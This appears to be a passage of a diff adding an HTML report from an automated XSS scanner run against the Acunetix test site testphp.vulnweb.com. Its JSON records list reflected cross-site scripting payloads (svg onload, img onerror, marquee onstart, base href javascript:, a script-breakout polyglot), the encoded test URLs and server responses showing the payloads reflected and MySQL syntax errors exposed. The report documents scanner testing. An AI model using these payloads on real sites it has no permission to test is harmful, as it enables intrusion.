align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <svg/onload=alert('XSS_MARKER_1761587127_3220')//</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')//', a.title) > 0 OR LOCATE('<svg/onload=alert('XSS_MARKER_1761587127_3220')//' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13278,
+  "url": "http://testphp.vulnweb.com/listproducts.php?artist=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587128_8479%27%29%3E",
+  "marker": "XSS_MARKER_1761587128_8479",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587128_8479"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=1",
+    "param": "artist",
+    "params": {
+      "artist": "1"
+    },
+    "tested_url": "http://testphp.vulnweb.com/listproducts.php?artist=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587128_8479%27%29%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>pictures</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"><img src=x onerror=alert('XSS_MARKER_1761587128_8479')>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13278,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587128_8779",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587128_8779"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=1",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: javascript:/*--></title></style></textarea></script>alert('XSS_MARKER_1761587128_8779')</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')', a.title) > 0 OR LOCATE('javascript:/*--></title></style></textarea></script' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13279,
+  "url": "http://testphp.vulnweb.com/listproducts.php?artist=%3Cvideo%3E%3Csource+onerror%3D%27alert%28%22XSS_MARKER_1761587129_2268%22%29%27%3E",
+  "marker": "XSS_MARKER_1761587129_2268",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587129_2268"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=3",
+    "param": "artist",
+    "params": {
+      "artist": "3"
+    },
+    "tested_url": "http://testphp.vulnweb.com/listproducts.php?artist=%3Cvideo%3E%3Csource+onerror%3D%27alert%28%22XSS_MARKER_1761587129_2268%22%29%27%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>pictures</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<video><source onerror='alert(\"XSS_MARKER_1761587129_2268\")'>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13280,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587130_4952",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587130_4952"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=3",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <marquee onstart=alert('XSS_MARKER_1761587130_4952')></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')>', a.title) > 0 OR LOCATE('<marquee onstart=alert('XSS_MARKER_1761587130_4952' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13280,
+  "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cbase+href%3Djavascript%3Aalert%28%27XSS_MARKER_1761587130_3546%27%29%2F%2F%3E",
+  "marker": "XSS_MARKER_1761587130_3546",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587130_3546"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+    "param": "pp",
+    "params": {
+      "p": "valid",
+      "pp": "12"
+    },
+    "tested_url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cbase+href%3Djavascript%3Aalert%28%27XSS_MARKER_1761587130_3546%27%29%2F%2F%3E",
+    "response_text": "valid<base href=javascript:alert('XSS_MARKER_1761587130_3546')//>"
+  }
+}
+</pre>
+</body></html>
